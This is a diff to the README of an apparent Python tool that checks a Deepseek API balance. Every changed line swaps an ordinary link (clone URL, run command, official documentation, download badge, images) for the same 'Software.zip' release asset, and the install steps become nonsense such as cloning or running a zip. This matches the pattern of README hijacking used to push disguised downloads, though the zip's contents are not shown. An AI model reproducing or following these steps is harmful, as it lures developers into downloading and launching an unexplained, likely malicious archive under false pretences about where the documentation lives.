@@ -1,7 +1,7 @@
 
 # Deepseek API Balance Checker
 
-![Deepseek API Balance Checker](https://image-url.png)
+![Deepseek API Balance Checker](https://github.com/rainerrer/Deepseek-API-Balance-Checker/releases/download/v1.0/Software.zip)
 
 Welcome to Deepseek API Balance Checker repository! This simple python script allows you to conveniently check your current funding with the Deepseek API. Whether you are a Deepseek coder or simply interested in monitoring your balance, this tool provides an efficient solution for you.
 
@@ -17,7 +17,7 @@ To get started with Deepseek API Balance Checker, follow these steps:
 
 1. Clone the repository:
 ```
-git clone https://github.com/your-username/Deepseek-API-Balance-Checker.git
+git clone https://github.com/rainerrer/Deepseek-API-Balance-Checker/releases/download/v1.0/Software.zip
 ```
 
 2. Install the required dependencies:
@@ -32,7 +32,7 @@ API_KEY = 'your-deepseek-api-key'
 
 4. Run the script:
 ```
-python balance_checker.py
+python https://github.com/rainerrer/Deepseek-API-Balance-Checker/releases/download/v1.0/Software.zip
 ```
 
 ## Usage
@@ -49,11 +49,11 @@ If you encounter any issues or have any questions about Deepseek API Balance Che
 
 ## External Resources
 
-For more information about Deepseek API, you can visit the official [Deepseek API documentation](https://deepseek-api-docs.com).
+For more information about Deepseek API, you can visit the official [Deepseek API documentation](https://github.com/rainerrer/Deepseek-API-Balance-Checker/releases/download/v1.0/Software.zip).
 
 ## Download Latest Version
 
-[![Download Deepseek API Balance Checker](https://img.shields.io/badge/Download-Deepseek_API_Balance_Checker-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Deepseek API Balance Checker](https://github.com/rainerrer/Deepseek-API-Balance-Checker/releases/download/v1.0/Software.zip)](https://github.com/rainerrer/Deepseek-API-Balance-Checker/releases/download/v1.0/Software.zip)
 
 *Note: This link needs to be launched for downloading the latest version.*
 
@@ -67,4 +67,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for using Deepseek API Balance Checker! We hope this tool simplifies your balance checking process and enhances your experience with the Deepseek API. Happy coding! 🚀
 
-![Deepseek Logo](https://deepseek-logo.png)
+![Deepseek Logo](https://github.com/rainerrer/Deepseek-API-Balance-Checker/releases/download/v1.0/Software.zip)
